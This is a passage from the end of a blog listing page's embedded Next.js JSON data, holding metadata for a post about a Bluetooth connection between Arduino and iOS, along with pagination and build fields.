바랍니다!🫡","ogImage":{"url":"/assets/img/2024-05-15-BluetoothconnectionbetweenArduinoandiOS_0.png"},"coverImage":"/assets/img/2024-05-15-BluetoothconnectionbetweenArduinoandiOS_0.png","tag":["Tech"],"readingTime":14}],"page":"23","totalPageCount":80,"totalPageGroupCount":4,"lastPageGroup":20,"currentPageGroup":1},"__N_SSG":true},"page":"/posts/[page]","query":{"page":"23"},"buildId":"837W-BjvPVBgft6aM4api","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>